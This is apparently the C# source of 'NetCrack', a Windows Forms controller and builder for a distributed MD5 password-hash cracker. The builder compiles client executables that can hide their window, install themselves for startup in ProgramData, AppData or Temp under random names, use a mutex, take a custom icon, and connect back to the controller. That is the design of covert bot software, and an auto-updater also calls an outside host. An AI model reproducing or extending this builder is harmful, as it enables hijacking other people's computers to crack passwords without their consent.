using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace NetCrack
{
    public partial class Form1 : Form
    {
        eSocket.Server _server;
        int ConnectedClientsCount = 0;
        int BlocksSent = 0;
        int Blocksrecieved = 0;
        bool isCracking = false;
        string HashCharset = "";
        string hash = "";
        List<int> HashBlock = new List<int>();
        List<eSocket.Server.eSockClient> ConnectedClients = new List<eSocket.Server.eSockClient>();
        public Form1()
        {
            AutoUpdater auto = new AutoUpdater("droidupdater.x10host.com");
            auto.Initilise("ee36c8ff71abf64b6535c4f0d098f99b", true);
            InitializeComponent();
            StartupLocation.Items.AddRange(new string[] {"ProgramData", "AppData", "Temp"});
            StartupLocation.SelectedIndex = 0;
        }

        private void EnableStartup_CheckedChanged(object sender, EventArgs e)
        {
            StartupLocation.Enabled = EnableStartup.Checked;
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            mutexName.Text = string.Format("NC2388291{0}", Guid.NewGuid().ToString().Replace("-", ""));
        }

        private void enableMutex_CheckedChanged(object sender, EventArgs e)
        {
            mutexName.Enabled = enableMutex.Checked;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            using(StartListeningForm slf = new StartListeningForm())
            {
                if(slf.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {
                    _server = new eSocket.Server(slf.ListeningPort);
                    if(!_server.Start())
                    {
                        MessageBox.Show("Failed to start listening on port " + slf.ListeningPort.ToString());
                        return;
                    }
                    button3.Text = string.Format("Listening on {0}", slf.ListeningPort);
                    button3.Enabled = false;
                    ControllGroup.Enabled = true;
                    _server.ClientConnectCallback += _server_ClientConnectCallback;
                    _server.DataRetrievedCallback += _server_DataRetrievedCallback;
                    _server.ClientDisconnectCallback += _server_ClientDisconnectCallback;
                    
                }
            }
        }

        public void SetConnectedClients(int c)
        {
            this.Invoke((MethodInvoker)delegate()
            {
                ConnectedClientsLabel.Text = c.ToString();
            });
        }
        public void SetBlocksStatus()
        {
            this.Invoke((MethodInvoker)delegate()
            {
                blockStatusLabel.Text = string.Format("{0}/{1}", BlocksSent, Blocksrecieved);
            });
        }
        public void SetCurrentBlockText(string bl)
        {
            this.Invoke((MethodInvoker)delegate()
            {
                CurrentBlock.Text = bl;
            });
        }

        public void SetHashOutput(string bl)
        {
            this.Invoke((MethodInvoker)delegate()
            {
                hashOutput.Text = bl;
            });
        }

        void _server_ClientDisconnectCallback(eSocket.Server.eSockClient c, System.Net.Sockets.SocketError SE)
        {
            List<eSocket.Server.eSockClient> newList = new List<eSocket.Server.eSockClient>();
            foreach (eSocket.Server.eSockClient cl in ConnectedClients)
                if (!cl.NetworkSocket.Equals(c.NetworkSocket))
                    newList.Add(cl);
            ConnectedClients = newList;
            ConnectedClientsCount -= 1;
            SetConnectedClients(ConnectedClientsCount);
        }

        public bool HashMatch(string tr, string hash)
        {
            MD5 hasher = MD5.Create();
            byte[] hashBytes = hasher.ComputeHash(Encoding.UTF8.GetBytes(tr));
            StringBuilder sb = new StringBuilder();
            foreach (byte b in hashBytes)
                sb.Append(b.ToString("x2"));
            return hash.ToLower() == sb.ToString().ToLower();
        }

        void _server_DataRetrievedCallback(eSocket.Server.eSockClient c, eSocket.PacketStructure packet, eSocket.Server.PacketError er)
        {
            try
            {
                if (!isCracking)
                    throw new Exception("Not cracking");
                if (er == eSocket.Server.PacketError.SizeIncorrect)
                    throw new Exception("Packet size is incorrect");
                Blocksrecieved += 1;
                SetBlocksStatus();
                if(packet.Type == (ushort)Packet.PacketType.MD5Cracked)
                {
                    Packet.MD5Cracked cracked = new Packet.MD5Cracked(packet.PacketBuffer);
                    if(HashMatch(cracked.Output, hash))
                    {
                        StopCracking();
                        SetHashOutput(cracked.Output);
                    }
                    else
                    {
                        SendClientBlock(c);
                    }
                }
                else
                {
                    SendClientBlock(c);
                }

            }
            catch(Exception ex)
            {
                //MessageBox.Show(ex.Message);
            }
        }

        public void SendClientBlock(eSocket.Server.eSockClient client)
        {
            if(HashBlock.Count == 0)
            {
                client.Send(new Packet.MD5FirstBlock(hash, HashCharset));
                HashBlock.AddRange(new int[] { 0, 0, 0});
                SetCurrentBlockText("???");
                BlocksSent += 1;
                SetBlocksStatus();
                return;
            }
            StringBuilder sBlock = new StringBuilder();
            foreach(int i in HashBlock)
            {
                if (i > HashCharset.Length - 1) 
                    continue;
                sBlock.Append(HashCharset[i]);
            }
            client.Send(new Packet.MD5Crack(hash, sBlock.ToString(), HashCharset));
            BlocksSent += 1;
            SetBlocksStatus();
            HashBlock[0] += 1;
            for(int i = 0; i < HashBlock.Count; i++)
            {
                if (HashBlock[i] == HashCharset.Length)
                {
                    if (i == HashBlock.Count)
                    {
                        HashBlock[i] = 0;
                        HashBlock.Add(0);
                    }
                    else
                    {
                        HashBlock[i + 1] += 1;
                        HashBlock[i] = 0;
                    }
                }
            }
            sBlock = new StringBuilder();
            foreach (int i in HashBlock)
            {
                if (i > HashCharset.Length)
                    continue;
                sBlock.Append(HashCharset[i]);
            }
            SetCurrentBlockText("???" + sBlock.ToString());
        }

        void _server_ClientConnectCallback(eSocket.Server.eSockClient c)
        {
            ConnectedClientsCount += 1;
            SetConnectedClients(ConnectedClientsCount);
            ConnectedClients.Add(c);
            if(isCracking)
                SendClientBlock(c);
        }

        private void button4_Click(object sender, EventArgs e)
        {
            HashBlock.Clear();
            if (!isCracking)
            {
                if (charset.Text == string.Empty)
                {
                    MessageBox.Show("Enter a charset!");
                    return;
                }
                if (targetHash.Text == string.Empty || targetHash.Text.Length != 32)
                {
                    MessageBox.Show("Enter a valid md5 hash.");
                    return;
                }
                isCracking = true;
                charset.Enabled = false;
                targetHash.Enabled = false;
                button4.Text = "Stop cracking";
                hashOutput.Text = "Cracking...";
                HashCharset = charset.Text;
                hash = targetHash.Text;
                BlocksSent = 0;
                Blocksrecieved = 0;
                SetBlocksStatus();
                foreach (eSocket.Server.eSockClient c in ConnectedClients)
                    SendClientBlock(c);
            }
            else
            {
                StopCracking();
            }
        }

        public void StopCracking()
        {
            isCracking = false;
            this.Invoke((MethodInvoker)delegate()
            {
                charset.Enabled = true;
                targetHash.Enabled = true;
                button4.Text = "Start cracking";
                hashOutput.Text = "Idle...";
            });
        }

        private void button2_Click(object sender, EventArgs e)
        {
            string saveLocation = "";
            using(SaveFileDialog sfd = new SaveFileDialog())
            {
                sfd.Filter = "Executable|*.exe";
                if (sfd.ShowDialog() != System.Windows.Forms.DialogResult.OK)
                    return;
                saveLocation = sfd.FileName;
            }
            string code = NetCrack.Properties.Resources.StubCode;
            code = code.Replace("[connectiondetails]", connectionBox.Text);
            code = code.Replace("[port]", portInt.Value.ToString());
            code = code.Replace("[mutexenabled]", enableMutex.Checked.ToString().ToLower());
            code = code.Replace("[mutex]", mutexName.Text);
            code = code.Replace("[startupenabled]", EnableStartup.Checked.ToString().ToLower());
            code = code.Replace("[startupfoldername]", StartupLocation.Text);
            code = code.Replace("[starupsubfolder]", Guid.NewGuid().ToString().Replace("-", ""));
            code = code.Replace("[startupexec]", Guid.NewGuid().ToString().Replace("-", ""));
            BuildCode(code, saveLocation, iconLocation.Text, "2", !Hidden.Checked);
                
        }

        bool BuildCode(string code, string output, string ico, string ver = "2", bool show = false, params string[] resource)
        {
            var compilerOptions = new CompilerParameters(new[] { "mscorlib.dll", "System.dll", "System.Windows.Forms.dll" })//"System.Xml.dll", "System.Core.dll", "System.Xml.Linq.dll"
            {
                OutputAssembly = output,
                GenerateExecutable = true
            };
            if(show)
            compilerOptions.CompilerOptions = "/platform:X86";
            if(show)
                compilerOptions.CompilerOptions += " /target:exe";//string.Format(" /target:winexe /win32icon:\"{0}\"", ico)
            else
                compilerOptions.CompilerOptions += " /target:winexe";
            if (ico != string.Empty && System.IO.File.Exists(ico))
                compilerOptions.CompilerOptions += string.Format(" /win32icon:\"{0}\"", ico);
            foreach (string s in resource)
                compilerOptions.EmbeddedResources.Add(s);
            CompilerResults results = new CSharpCodeProvider(new Dictionary<string, string> { { "CompilerVersion", string.Format("v{0}.0", ver) } }).CompileAssemblyFromSource(compilerOptions, code);
            bool b = false;
            if (results.Errors.HasErrors)
            {
                StringBuilder sb = new StringBuilder();
                foreach (CompilerError e in results.Errors)
                    sb.Append(string.Format("{0}: {1}\n", e.Line, e.ErrorText));
                MessageBox.Show(sb.ToString());
                b = false;
            }
            else
            {
                b = true;
                MessageBox.Show("Build success!");
            }
            results.TempFiles.Delete();
            return b;
        }

        private void button5_Click(object sender, EventArgs e)
        {
            using(OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Filter = "Icon|*.ico";
                if(ofd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                    iconLocation.Text = ofd.FileName;
            }
        }
    }

    public class Packet
    {
        public class MD5Crack : eSocket.PacketStructure
        {
            public MD5Crack(string md5, string block, string charset)
                : base((ushort)(md5.Length + block.Length + charset.Length + 2), (ushort)Packet.PacketType.MD5Crack)
            {
                WriteUShort(4, (ushort)charset.Length);
                WriteString(6, md5, Encoding.UTF8);
                WriteString(38, block, Encoding.UTF8);
                WriteString(38 + block.Length, charset, Encoding.UTF8);
            }
            public MD5Crack(byte[] pack)
                : base(pack)
            { }
            public string MD5
            {
                get { return ReadString(6, 32, Encoding.UTF8); }
            }
            public string Block
            {
                get { return ReadString(38, Length - CharsetLength - 38, Encoding.UTF8); }
            }
            public string Charset
            {
                get { return ReadString(Length - CharsetLength, CharsetLength, Encoding.UTF8); }
            }
            public ushort CharsetLength
            {
                get { return ReadUShort(4); }
            }
        }   //MD5BlockComplete
        public class MD5BlockComplete : eSocket.PacketStructure
        {
            public MD5BlockComplete(string hash)
                : base(hash.Length, (ushort)Packet.PacketType.MD5BlockComplete)
            {
                WriteString(4, hash, Encoding.UTF8);
            }
            public MD5BlockComplete(byte[] pack)
                :base(pack)
            { }
            public string MD5
            {
                get { return ReadString(4, 32, Encoding.UTF8); }
            }
        }
        public class MD5Cracked : eSocket.PacketStructure
        {
            public MD5Cracked(string hash, string responce)
                : base(hash.Length + responce.Length, (ushort)Packet.PacketType.MD5Cracked)
            {
                WriteString(4, hash, Encoding.UTF8);
                WriteString(hash.Length + 4, responce, Encoding.UTF8);
            }
            public MD5Cracked(byte[] pack)
                : base(pack)
            { }
            public string MD5
            {
                get { return ReadString(4, 32, Encoding.UTF8); }
            }
            public string Output
            {
                get { return ReadString(36, Length - 36, Encoding.UTF8); }
            }
        }
        public class MD5FirstBlock : eSocket.PacketStructure
        {
            public MD5FirstBlock(string hash, string charset)
                : base((ushort)(hash.Length + charset.Length), (ushort)Packet.PacketType.MD5FirstBlock)
            {
                WriteString(4, hash, Encoding.UTF8);
                WriteString(36, charset, Encoding.UTF8);
            }
            public MD5FirstBlock(byte[] pack)
                : base(pack)
            { }
            public string Hash
            {
                get { return ReadString(4, 32, Encoding.UTF8); }
            }
            public string Charset
            {
                get { return ReadString(36, Length - 36, Encoding.UTF8); }
            }
        }

        public enum PacketType
        {
            MD5Crack,
            MD5BlockComplete,
            MD5Cracked,
            MD5FirstBlock
        }
    }

}
